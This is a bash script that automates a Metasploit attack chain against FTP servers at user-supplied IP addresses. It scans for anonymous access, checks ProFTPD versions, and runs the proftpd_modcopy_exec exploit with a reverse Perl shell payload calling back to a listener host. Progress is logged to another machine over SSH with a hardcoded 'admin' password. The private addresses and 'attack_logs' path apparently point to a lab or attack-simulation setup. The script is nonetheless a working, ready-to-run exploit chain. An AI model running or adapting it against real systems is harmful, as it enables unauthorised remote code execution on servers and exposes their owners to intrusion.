#!/bin/bash

if [ "$#" -eq 0 ]; then
  echo "Usage: $0 <ip_address1> [<ip_address2> ...]"
  exit 1
fi
# collect the number of IPs
num_IPs=$(( $# ))
sleep_time=$((10 * num_IPs))
# collect the IP adresses in IPs variable
IPs=""
for ip in "$@"; do
  IPs="$IPs $ip"
done
# log file path
log_path="/home/ubuntu/attack_logs/proftp_exploit_log_$(date +'%Y-%m-%d_%H:%M:%S').log"
log_server="10.10.2.74"
# Create a resource script `msfconsole` to run the modules
# FTP scanning on the selected IPs
echo "use auxiliary/scanner/ftp/anonymous" > proftp_exploit_msfconsole.rc
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') proftp exploit : Anonymous Scanning \" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> proftp_exploit_msfconsole.rc

echo "set RHOSTS $IPs" >> proftp_exploit_msfconsole.rc
echo "exploit -j" >> proftp_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> proftp_exploit_msfconsole.rc
# FTP version scanning
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') proftp exploit : version Scanning \" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> proftp_exploit_msfconsole.rc

echo "use auxiliary/scanner/ftp/ftp_version" >> proftp_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> proftp_exploit_msfconsole.rc
echo "exploit -j -z" >> proftp_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> proftp_exploit_msfconsole.rc
# wait for exploit to finish
sleep 10
# load module to exploit proftp
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') proftp exploit : execute modcopy_exec \" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> proftp_exploit_msfconsole.rc
echo "use exploit/unix/ftp/proftpd_modcopy_exec" >> proftp_exploit_msfconsole.rc
# set module parameters
echo "set RHOSTS $IPs" >> proftp_exploit_msfconsole.rc
echo "set payload payload/cmd/unix/reverse_perl" >> proftp_exploit_msfconsole.rc
echo "set RPORT_FTP 2121" >> proftp_exploit_msfconsole.rc
echo "set LHOST 10.10.2.189" >> proftp_exploit_msfconsole.rc
echo "set LPORT 4444" >> proftp_exploit_msfconsole.rc
echo "set SITEPATH /var/www/html" >> proftp_exploit_msfconsole.rc
# start exploit
echo "exploit -j -z" >> proftp_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> proftp_exploit_msfconsole.rc 
# exit metasploit: -y to close the sessions before exiting
# echo "exit -y" >> proftp_exploit_msfconsole.rc  
# run metasploit
msfconsole -r proftp_exploit_msfconsole.rc

